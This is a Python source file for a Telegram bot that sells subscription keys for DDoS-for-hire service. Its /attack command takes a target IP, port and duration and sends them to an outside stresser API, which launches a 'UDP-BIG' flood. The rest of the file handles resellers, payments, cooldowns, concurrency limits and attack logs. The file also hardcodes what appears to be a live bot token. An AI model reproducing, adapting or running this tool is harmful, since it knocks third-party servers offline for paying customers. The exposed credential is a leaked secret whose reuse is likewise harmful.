import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import re
from datetime import datetime, timedelta
import time
import requests
import json
import string
import random
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════
#                              CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8713116904:AAEAfKm5KFAFj0X7DPH-3DD-WEl2Sx_RuF0")

# Bot Owners - Environment variable se list lo
DEFAULT_OWNERS = [8016491077, 8305984975, 5251460508]
owners_str = os.environ.get("BOT_OWNERS", "")
if owners_str:
    BOT_OWNERS = [int(x.strip()) for x in owners_str.split(",")]
else:
    BOT_OWNERS = DEFAULT_OWNERS

bot = telebot.TeleBot(BOT_TOKEN)

# Data file path
DATA_FILE = "grp_data.json"

# Default API Configuration (will be changeable via command)
DEFAULT_API_URL = os.environ.get("API_URL", "https://satellitestress.st/api/v1/attack/start")
DEFAULT_API_KEY = os.environ.get("API_KEY", "")

# Default settings
DEFAULT_CONCURRENT = 4
DEFAULT_MAX_ATTACK_TIME = 240
DEFAULT_COOLDOWN = 300
PORT_BLOCK_DURATION = 7200
FEEDBACK_CHANNEL_ID = -5234158198


# ═══════════════════════════════════════════════════════════════════════════
#                              DATA MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

def get_default_data():
    return {
        "users": {},
        "keys": {},
        "resellers": {},
        "rates": {},
        "banned_users": [],
        "temp_banned_spam": {},
        "max_attack_time": DEFAULT_MAX_ATTACK_TIME,
        "cooldown": DEFAULT_COOLDOWN,
        "concurrent": DEFAULT_CONCURRENT,
        "blocked_ports": {},
        "port_protection": False,
        "approved_groups": [],
        "feedbacks": [],
        "api_url": DEFAULT_API_URL,
        "api_key": DEFAULT_API_KEY,
        "feedback_required": True,
        "cooldown_enabled": True,
        "admins": [],
        "videos": [],
        "attack_logs": [],
        "payment_qr": None,
        "spam_protection": True
    }

def load_data():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                loaded_data = json.load(f)
                default = get_default_data()
                for key in default:
                    if key not in loaded_data:
                        loaded_data[key] = default[key]
                return loaded_data
        return get_default_data()
    except Exception as e:
        logger.error(f"Error loading data: {e}")
        return get_default_data()

def save_data():
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

data = load_data()

# ═══════════════════════════════════════════════════════════════════════════
#                              GLOBAL VARIABLES
# ═══════════════════════════════════════════════════════════════════════════

active_attacks = {}
user_cooldowns = {}
user_attack_history = {}
_attack_lock = threading.Lock()

pending_feedback = {}
feedback_deadlines = {}
temp_banned_users = {}

# Funny videos list
funny_videos = [
    "https://files.catbox.moe/pacadw.mp4",
    "https://files.catbox.moe/8k9zmt.mp4",
    "https://files.catbox.moe/1cskm1.mp4",
    "https://files.catbox.moe/xr9y6b.mp4",
    "https://files.catbox.moe/3honi0.mp4",
    "https://files.catbox.moe/xuhmq0.mp4",
    "https://files.catbox.moe/wjtilc.mp4",
    "https://files.catbox.moe/mit6r7.mp4",
    "https://files.catbox.moe/edaojm.mp4",
    "https://files.catbox.moe/cnc8j7.mp4",
    "https://files.catbox.moe/zr3nhn.mp4",
    "https://files.catbox.moe/o4lege.mp4",
    "https://files.catbox.moe/s6wgor.mp4",
    "https://files.catbox.moe/4kmo3m.mp4",
    "https://files.catbox.moe/em27tu.mp4"
]

def get_random_video():
    return random.choice(data.get("videos", funny_videos) or funny_videos)

# ═══════════════════════════════════════════════════════════════════════════
#                              HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

def is_owner(user_id):
    return user_id in BOT_OWNERS

def is_admin(user_id):
    return user_id in BOT_OWNERS or user_id in data.get("admins", [])

def is_banned(user_id):
    return user_id in data.get("banned_users", [])

def is_temp_banned(user_id):
    if user_id in temp_banned_users:
        if time.time() < temp_banned_users[user_id]:
            return True
        else:
            del temp_banned_users[user_id]
    return False

def is_spam_banned(user_id):
    spam_bans = data.get("temp_banned_spam", {})
    if str(user_id) in spam_bans:
        if time.time() < spam_bans[str(user_id)]:
            return True
        else:
            del spam_bans[str(user_id)]
            save_data()
    return False

def check_user_active(user_id):
    users = data.get("users", {})
    str_uid = str(user_id)
    if str_uid not in users:
        return False
    expiry_str = users[str_uid].get("expiry_time")
    if not expiry_str:
        return False
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        return datetime.now() < expiry
    except:
        return False

def get_days_remaining(user_id):
    users = data.get("users", {})
    str_uid = str(user_id)
    if str_uid not in users:
        return 0
    expiry_str = users[str_uid].get("expiry_time")
    if not expiry_str:
        return 0
    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        remaining = expiry - datetime.now()
        if remaining.total_seconds() > 0:
            return remaining.days
        return 0
    except:
        return 0

def check_access(message):
    user_id = message.from_user.id

    if is_owner(user_id):
        return True
    
    if is_spam_banned(user_id):
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⛔ SPAM BANNED FOR 5 MIN   ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  You have been banned for   ┃\n"
            "┃  spamming. Please wait.     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return False
    
    if is_temp_banned(user_id):
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⛔ TEMPORARILY BANNED      ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  Missed feedback            ┃\n"
            "┃  Please wait or contact     ┃\n"
            "┃  admin                      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return False

    if not check_user_active(user_id):
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  🚫 NO ACTIVE PLAN          ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  Use /redeem key to         ┃\n"
            "┃  activate your plan         ┃\n"
            "┃                             ┃\n"
            "┃  Contact admin to buy       ┃\n"
            "┃  a key                      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return False

    if is_banned(user_id):
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  🚫 YOU'RE BANNED!          ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  Contact owner to resolve   ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return False

    return True

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    
    multipliers = {
        's': 1,
        'm': 60,
        'h': 3600,
        'd': 86400,
        'w': 604800,
        'mo': 2592000
    }
    
    for suffix, multiplier in multipliers.items():
        if duration_str.endswith(suffix):
            try:
                num = int(duration_str[:-len(suffix)])
                return num * multiplier
            except ValueError:
                pass
    
    try:
        return int(duration_str) * 86400
    except ValueError:
        raise ValueError(f"Invalid duration format: {duration_str}")

def get_user_cooldown(user_id):
    if not data.get("cooldown_enabled", True):
        return 0
    with _attack_lock:
        if user_id not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[user_id]
            return 0
        return int(remaining)

def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False

def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
        return len(active_attacks)

def is_port_blocked(target, port):
    key = f"{target}:{port}"
    blocked = data.get("blocked_ports", {})
    if key in blocked:
        try:
            block_time = datetime.strptime(blocked[key], '%d-%m-%Y %H:%M:%S')
            if (datetime.now() - block_time).total_seconds() < PORT_BLOCK_DURATION:
                remaining = PORT_BLOCK_DURATION - (datetime.now() - block_time).total_seconds()
                return True, int(remaining)
            else:
                del blocked[key]
                save_data()
        except:
            pass
    return False, 0

def check_port_protection(user_id, target, port):
    if not data.get("port_protection", False):
        return False, 0
    key = f"{target}:{port}"
    if user_id in user_attack_history and key in user_attack_history[user_id]:
        last_attack = user_attack_history[user_id][key]
        elapsed = (datetime.now() - last_attack).total_seconds()
        if elapsed < PORT_BLOCK_DURATION:
            remaining = PORT_BLOCK_DURATION - elapsed
            return True, int(remaining)
    return False, 0

# ═══════════════════════════════════════════════════════════════════════════
#                              ATTACK FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

def start_attack(target, port, duration, message, attack_id):
    try:
        user_id = message.from_user.id
        username = message.from_user.first_name if message.from_user.first_name else "User"
        
        bot.send_video(message.chat.id, get_random_video(), caption=(
            "<pre>\n"
            "╔══════════════════════════════════════════════════════╗\n"
            "║  🚀 ATTACK STARTED!                                  ║\n"
            "╠══════════════════════════════════════════════════════╣\n"
            f"║  📍 TARGET: {target}:{port}                           ║\n"
            f"║  ⏱ DURATION: {duration}s                              ║\n"
            f"║  👤 USER: {username}                                  ║\n"
            "╠══════════════════════════════════════════════════════╣\n"
            "║  📊 Use /status for live progress                    ║\n"
            "║     or /stop to cancel                               ║\n"
            "╚══════════════════════════════════════════════════════╝\n"
            "</pre>"
        ), parse_mode="HTML")

        params = {
            "key": data.get("api_key", DEFAULT_API_KEY),
            "host": target,
            "port": port,
            "time": duration,
            "method": "UDP-BIG",
            "concurrent": 1,
            "running": "",
            "plan": "",
            "capacity": ""
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*",
            "Connection": "keep-alive"
        }

        try:
            api_url = data.get("api_url", DEFAULT_API_URL)
            response = requests.get(api_url, params=params, headers=headers, timeout=15)
            logger.info(f"✅ API Response: {response.status_code} - {response.text[:100]}")
        except Exception as e:
            logger.warning(f"⚠️ API error: {e}")

        if user_id not in user_attack_history:
            user_attack_history[user_id] = {}
        user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

        # Log attack
        attack_log = {
            "user_id": user_id,
            "username": username,
            "target": target,
            "port": port,
            "duration": duration,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        if "attack_logs" not in data:
            data["attack_logs"] = []
        data["attack_logs"].append(attack_log)
        if len(data["attack_logs"]) > 1000:
            data["attack_logs"] = data["attack_logs"][-1000:]
        save_data()

        time.sleep(duration)

        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]

        bot.send_video(message.chat.id, get_random_video(), caption=(
            "<pre>\n"
            "╔══════════════════════════════════════════════════════╗\n"
            "║  ✅ ATTACK FINISHED!                                 ║\n"
            "╠══════════════════════════════════════════════════════╣\n"
            f"║  📍 TARGET: {target}:{port}                           ║\n"
            f"║  ⏱ DURATION: {duration}s                              ║\n"
            "╠══════════════════════════════════════════════════════╣\n"
            "║  📝 Please submit feedback!                         ║\n"
            "║     Send a photo or text to provide feedback        ║\n"
            "╚══════════════════════════════════════════════════════╝\n"
            "</pre>"
        ), parse_mode="HTML")

    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
        logger.error(f"❌ Attack error: {e}")

# ═══════════════════════════════════════════════════════════════════════════
#                              COMMAND HANDLERS (MAIN)
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "USER"
    
    bot_user = bot.get_me()
    bot_name = bot_user.first_name
    bot_id = bot_user.id
    
    text = (
        "<pre>\n"
        "╔══════════════════════════════════════════════════════╗\n"
        "║     ⚡ SLASH BOT ⚡                                   ║\n"
        "╠══════════════════════════════════════════════════════╣\n"
        f"║  HELLO » {user_name}\n"
        f"║  YOUR ID » {user_id}\n"
        f"║  BOT NAME » {bot_name}\n"
        f"║  BOT ID » {bot_id}\n"
        "╠══════════════════════════════════════════════════════╣\n"
        "║  DEVELOPER » @LASTWISHES01                         ║\n"
        "╠══════════════════════════════════════════════════════╣\n"
        "║  📊 BOT COMMANDS                                     ║\n"
        "╠══════════════════════════════════════════════════════╣\n"
        "║  🎯 /attack ip port time                             ║\n"
        "║  📊 /status  - live status                           ║\n"
        "║  📦 /myplan  - check plan                            ║\n"
        "║  🔑 /redeem  - activate key                          ║\n"
        "║  ❓ /help    - help menu                             ║\n"
        "║  ℹ️ /info    - bot info                              ║\n"
        "║  💰 /buy     - buy plan (QR code)                    ║\n"
        "╚══════════════════════════════════════════════════════╝\n"
        "</pre>"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['buy'])
def buy_command(message):
    """Handle /buy command - Show payment QR code"""
    qr_data = data.get("payment_qr")
    
    if not qr_data:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  💰 PAYMENT NOT AVAILABLE     ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  Payment method not set yet.  ┃\n"
            "┃  Contact admin to buy.        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    # If qr_data is a file path or URL
    if os.path.exists(qr_data):
        with open(qr_data, 'rb') as f:
            bot.send_photo(message.chat.id, f, caption=
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  💰 SCAN QR CODE TO PAY       ┃\n"
                "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                "┃  After payment, contact admin ┃\n"
                "┃  with transaction ID to get   ┃\n"
                "┃  your activation key.         ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
    else:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  💰 CONTACT ADMIN TO BUY      ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  Payment: Contact owner       ┃\n"
            "┃  @LASTWISHES01              ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    
    text = (
        "<pre>\n"
        "╔══════════════════════════════════════════════════════╗\n"
        "║  ❓ HELP MENU                                        ║\n"
        "╠══════════════════════════════════════════════════════╣\n"
        "║  📋 USER COMMANDS:                                   ║\n"
        "║  ────────────────────────────────────────────────── ║\n"
        "║  /start - start the bot                             ║\n"
        "║  /attack ip port time - launch attack               ║\n"
        "║  /status - check attack status                      ║\n"
        "║  /myplan - view your subscription                   ║\n"
        "║  /redeem key - redeem access key                    ║\n"
        "║  /info - view bot information                       ║\n"
        "║  /buy - buy plan (QR code)                          ║\n"
        "╠══════════════════════════════════════════════════════╣\n"
        "║  📝 DURATION FORMATS:                                ║\n"
        "║  ────────────────────────────────────────────────── ║\n"
        "║  1h = 1 hour  │ 1d = 1 day                          ║\n"
        "║  1w = 1 week  │ 1m = 1 month                        ║\n"
        "╠══════════════════════════════════════════════════════╣\n"
        "║  💡 TIPS:                                            ║\n"
        "║  ────────────────────────────────────────────────── ║\n"
        "║  • max attack time varies by plan                   ║\n"
        "║  • cooldown applies between attacks                 ║\n"
        "║  • send a photo after attack for feedback           ║\n"
    )
    
    if is_admin(user_id):
        text += (
            "╠══════════════════════════════════════════════════════╣\n"
            "║  👑 ADMIN/OWNER COMMANDS:                            ║\n"
            "║  ────────────────────────────────────────────────── ║\n"
            "║  /owner - owner panel                               ║\n"
            "║  /admin_panel - admin panel                         ║\n"
            "║  /add_admin id - add admin                          ║\n"
            "║  /remove_admin id - remove admin                    ║\n"
            "║  /admin_list - list admins                          ║\n"
            "║  /user_info id - get user info                      ║\n"
            "║  /reset_user id - reset user plan                   ║\n"
        )
    
    if is_owner(user_id):
        text += (
            "╠══════════════════════════════════════════════════════╣\n"
            "║  👑 OWNER EXTRA COMMANDS:                            ║\n"
            "║  ────────────────────────────────────────────────── ║\n"
            "║  /set_api url key - set API URL and KEY              ║\n"
            "║  /show_api - show current API settings              ║\n"
            "║  /feedback_toggle on/off - toggle feedback required  ║\n"
            "║  /cooldown_toggle on/off - toggle cooldown           ║\n"
            "║  /spam_toggle on/off - toggle spam protection        ║\n"
            "║  /set_qr - set payment QR code                       ║\n"
            "║  /backup - backup data                               ║\n"
            "║  /restore - restore data                             ║\n"
        )
    
    text += "\n╚══════════════════════════════════════════════════════╝\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          ATTACK COMMANDS
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    
    if not check_access(message):
        return
    
    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(message,
            "<pre>\n"
            "╔════════════════════════════════════════════╗\n"
            "║  ⚠️ INVALID FORMAT                         ║\n"
            "╠════════════════════════════════════════════╣\n"
            "║  Usage: /attack ip port time              ║\n"
            "║  Example: /attack 1.2.3.4 80 60           ║\n"
            "╚════════════════════════════════════════════╝\n"
            "</pre>", parse_mode="HTML")
        return
    
    try:
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "╔════════════════════════════════════════════╗\n"
            "║  ❌ INVALID PORT OR TIME                   ║\n"
            "╠════════════════════════════════════════════╣\n"
            "║  Port and time must be numbers.           ║\n"
            "╚════════════════════════════════════════════╝\n"
            "</pre>", parse_mode="HTML")
        return
    
    if not validate_target(target):
        bot.reply_to(message,
            "<pre>\n"
            "╔════════════════════════════════════════════╗\n"
            "║  ❌ INVALID IP ADDRESS FORMAT              ║\n"
            "╚════════════════════════════════════════════╝\n"
            "</pre>", parse_mode="HTML")
        return
    
    if port < 1 or port > 65535:
        bot.reply_to(message,
            "<pre>\n"
            "╔════════════════════════════════════════════╗\n"
            "║  ❌ INVALID PORT                           ║\n"
            "╠════════════════════════════════════════════╣\n"
            "║  Port must be between 1 and 65535.        ║\n"
            "╚════════════════════════════════════════════╝\n"
            "</pre>", parse_mode="HTML")
        return
    
    max_time = data.get("max_attack_time", DEFAULT_MAX_ATTACK_TIME)
    if duration < 10:
        bot.reply_to(message,
            "<pre>\n"
            "╔════════════════════════════════════════════╗\n"
            "║  ❌ MINIMUM ATTACK TIME                    ║\n"
            "╠════════════════════════════════════════════╣\n"
            "║  Minimum attack time is 10 seconds.       ║\n"
            "╚════════════════════════════════════════════╝\n"
            "</pre>", parse_mode="HTML")
        return
    
    if duration > max_time and not is_owner(user_id):
        bot.reply_to(message,
            f"<pre>\n"
            f"╔════════════════════════════════════════════╗\n"
            f"║  ❌ MAXIMUM ATTACK TIME EXCEEDED           ║\n"
            f"╠════════════════════════════════════════════╣\n"
            f"║  Maximum attack time is {max_time} sec.      ║\n"
            f"╚════════════════════════════════════════════╝\n"
            f"</pre>", parse_mode="HTML")
        return
    
    cooldown = get_user_cooldown(user_id)
    if cooldown > 0 and not is_owner(user_id):
        bot.reply_to(message,
            f"<pre>\n"
            f"╔════════════════════════════════════════════╗\n"
            f"║  ⏳ COOLDOWN ACTIVE                        ║\n"
            f"╠════════════════════════════════════════════╣\n"
            f"║  Please wait {cooldown} seconds.              ║\n"
            f"╚════════════════════════════════════════════╝\n"
            f"</pre>", parse_mode="HTML")
        return
    
    concurrent = data.get("concurrent", DEFAULT_CONCURRENT)
    active_count = get_active_attack_count()
    if active_count >= concurrent and not is_owner(user_id):
        bot.reply_to(message,
            f"<pre>\n"
            f"╔════════════════════════════════════════════╗\n"
            f"║  ⚠️ CONCURRENT LIMIT REACHED               ║\n"
            f"╠════════════════════════════════════════════╣\n"
            f"║  Maximum concurrent attacks is {concurrent}.  ║\n"
            f"║  Please wait.                             ║\n"
            f"╚════════════════════════════════════════════╝\n"
            f"</pre>", parse_mode="HTML")
        return
    
    if user_has_active_attack(user_id) and not is_owner(user_id):
        bot.reply_to(message,
            "<pre>\n"
            "╔════════════════════════════════════════════╗\n"
            "║  ⚠️ ACTIVE ATTACK DETECTED                 ║\n"
            "╠════════════════════════════════════════════╣\n"
            "║  You already have an active attack.       ║\n"
            "║  Wait for it to finish.                   ║\n"
            "╚════════════════════════════════════════════╝\n"
            "</pre>", parse_mode="HTML")
        return
    
    blocked, remaining = is_port_blocked(target, port)
    if blocked:
        mins = remaining // 60
        secs = remaining % 60
        bot.reply_to(message,
            f"<pre>\n"
            f"╔════════════════════════════════════════════╗\n"
            f"║  🚫 PORT IS BLOCKED                        ║\n"
            f"╠════════════════════════════════════════════╣\n"
            f"║  This port is blocked for {mins}m {secs}s.     ║\n"
            f"╚════════════════════════════════════════════╝\n"
            f"</pre>", parse_mode="HTML")
        return
    
    protected, prot_remaining = check_port_protection(user_id, target, port)
    if protected and not is_owner(user_id):
        mins = prot_remaining // 60
        secs = prot_remaining % 60
        bot.reply_to(message,
            f"<pre>\n"
            f"╔════════════════════════════════════════════╗\n"
            f"║  🛡️ PORT PROTECTION ACTIVE                 ║\n"
            f"╠════════════════════════════════════════════╣\n"
            f"║  Wait {mins}m {secs}s before attacking this   ║\n"
            f"║  IP:Port again.                           ║\n"
            f"╚════════════════════════════════════════════╝\n"
            f"</pre>", parse_mode="HTML")
        return
    
    attack_id = f"{user_id}_{int(time.time())}"
    
    with _attack_lock:
        active_attacks[attack_id] = {
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'is_owner': is_owner(user_id),
            'start_time': datetime.now(),
            'end_time': datetime.now() + timedelta(seconds=duration)
        }
    
    cooldown_time = data.get("cooldown", DEFAULT_COOLDOWN)
    if cooldown_time > 0 and not is_owner(user_id) and data.get("cooldown_enabled", True):
        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time + duration)
    
    attack_thread = threading.Thread(
        target=start_attack,
        args=(target, port, duration, message, attack_id),
        daemon=True
    )
    attack_thread.start()
    
    bot.reply_to(message,
        f"<pre>\n"
        f"╔════════════════════════════════════════════╗\n"
        f"║  ✅ ATTACK STARTED SUCCESSFULLY!           ║\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║  🎯 TARGET: {target}:{port}                  ║\n"
        f"║  ⏱️ DURATION: {duration}s                     ║\n"
        f"║  👤 USER: {message.from_user.first_name}         ║\n"
        f"╠════════════════════════════════════════════╣\n"
        f"║  📊 Use /status to track progress          ║\n"
        f"║  🛑 Use /stop to cancel attack             ║\n"
        f"╚════════════════════════════════════════════╝\n"
        f"</pre>", parse_mode="HTML")
    
    logger.info(f"✅ Attack started by {user_id}: {target}:{port} for {duration}s")

@bot.message_handler(commands=['stop'])
def stop_attack_command(message):
    user_id = message.from_user.id
    
    if not check_access(message):
        return
    
    with _attack_lock:
        found = False
        for attack_id, attack in list(active_attacks.items()):
            if attack.get('user_id') == user_id:
                del active_attacks[attack_id]
                found = True
                break
        
        if found:
            bot.reply_to(message,
                "<pre>\n"
                "╔════════════════════════════════════════════╗\n"
                "║  ✅ ATTACK STOPPED SUCCESSFULLY            ║\n"
                "╚════════════════════════════════════════════╝\n"
                "</pre>", parse_mode="HTML")
        else:
            bot.reply_to(message,
                "<pre>\n"
                "╔════════════════════════════════════════════╗\n"
                "║  ℹ️ NO ACTIVE ATTACK FOUND                 ║\n"
                "╚════════════════════════════════════════════╝\n"
                "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.from_user.id
    
    active_count = get_active_attack_count()
    concurrent = data.get("concurrent", DEFAULT_CONCURRENT)
    
    user_attack = None
    with _attack_lock:
        for attack_id, attack in active_attacks.items():
            if attack.get('user_id') == user_id:
                user_attack = attack
                break
    
    text = (
        "<pre>\n"
        "╔════════════════════════════════════════════╗\n"
        "║  📊 BOT STATUS                             ║\n"
        "╠════════════════════════════════════════════╣\n"
        f"║  🔄 ACTIVE ATTACKS: {active_count}/{concurrent}         ║\n"
        "╠════════════════════════════════════════════╣\n"
    )
    
    if user_attack:
        remaining = (user_attack['end_time'] - datetime.now()).total_seconds()
        if remaining > 0:
            total = user_attack['duration']
            elapsed = total - remaining
            percentage = min(100, int((elapsed / total) * 100))
            bar_length = 15
            filled = int((percentage / 100) * bar_length)
            bar = "█" * filled + "▒" * (bar_length - filled)
            
            text += (
                f"║  🎯 YOUR ATTACK:                         ║\n"
                f"║  📍 TARGET: {user_attack['target']}:{user_attack['port']}\n"
                f"║  ⏱️ REMAINING: {int(remaining)}s                       ║\n"
                f"║  📊 PROGRESS: [{bar}] {percentage}%             ║\n"
            )
        else:
            text += "║  ✅ NO ACTIVE ATTACK                         ║\n"
    else:
        text += "║  ✅ NO ACTIVE ATTACK                         ║\n"
    
    cooldown = get_user_cooldown(user_id)
    if cooldown > 0 and not is_owner(user_id):
        text += (
            "╠════════════════════════════════════════════╣\n"
            f"║  ⏳ COOLDOWN: {cooldown}s REMAINING                   ║\n"
        )
    
    text += "╚════════════════════════════════════════════╝\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['myplan'])
def myplan_command(message):
    user_id = str(message.from_user.id)
    users = data.get("users", {})
    
    if user_id in users:
        expiry_str = users[user_id].get("expiry_time", "No plan")
        days = get_days_remaining(int(user_id))
        
        text = (
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📦 MY PLAN                   ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 ID: {user_id}\n"
            f"┃  📅 EXPIRY: {expiry_str[:10]}\n"
            f"┃  ⏳ DAYS LEFT: {days}\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  ⚡ MAX TIME: {data.get('max_attack_time', DEFAULT_MAX_ATTACK_TIME)}s\n"
            f"┃  ⏱️ COOLDOWN: {data.get('cooldown', DEFAULT_COOLDOWN)}s\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>"
        )
    else:
        text = (
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📦 MY PLAN                   ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 ID: {user_id}\n"
            "┃  📅 EXPIRY: NO ACTIVE PLAN    ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            "┃  💡 /redeem key to activate   ┃\n"
            "┃  💰 /buy to purchase          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>"
        )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['info'])
def info_command(message):
    user_id = message.from_user.id
    
    if is_owner(user_id):
        text = (
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ℹ️ USER INFO                 ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 ID: {user_id}\n"
            "┃  👑 RANK: OWNER              ┃\n"
            "┃  ⚡ FULL ACCESS              ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>"
        )
        bot.reply_to(message, text, parse_mode="HTML")
        return
    
    if is_admin(user_id):
        text = (
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ℹ️ USER INFO                 ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 ID: {user_id}\n"
            "┃  👑 RANK: ADMIN              ┃\n"
            "┃  ⚡ LIMITED ACCESS           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>"
        )
        bot.reply_to(message, text, parse_mode="HTML")
        return
    
    if str(user_id) in data.get("resellers", {}):
        reseller_data = data.get("resellers", {}).get(str(user_id), {})
        balance = reseller_data.get("balance", 0)
        text = (
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ℹ️ USER INFO                 ┃\n"
            "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
            f"┃  👤 ID: {user_id}\n"
            "┃  🎖️ RANK: RESELLER           ┃\n"
            f"┃  💰 BALANCE: {balance}\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>"
        )
        bot.reply_to(message, text, parse_mode="HTML")
